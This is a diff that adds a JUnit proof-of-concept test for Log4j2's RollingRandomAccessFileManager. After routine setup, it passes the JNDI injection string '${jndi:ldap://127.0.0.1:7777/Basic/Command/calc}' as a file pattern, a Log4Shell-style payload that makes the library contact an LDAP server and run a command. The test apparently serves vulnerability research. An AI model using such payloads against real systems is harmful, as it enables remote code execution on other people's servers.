@@ -85,6 +85,30 @@ public class FileManagerPocsTests {
     }
 
     @Test
+    public void getFileManagerRollingRandomAccessFileManagerTest(){
+        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
+        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
+                .withMax(String.valueOf(3))
+                .withConfig(new DefaultConfiguration())
+                .withFileIndex("min")
+                .build();
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+        Configuration config = new DefaultConfiguration();
+
+        // First execute add manager into MAP
+        RollingRandomAccessFileManager.getFileManager(
+                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);
+
+        // Second call executes updateData from MAP
+        RollingRandomAccessFileManager.getFileManager(
+                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);
+
+    }
+
+    @Test
     public void cronTriggerPolicyTest(){
         PatternLayout layout = PatternLayout.newBuilder()
                 .withConfiguration(new DefaultConfiguration())
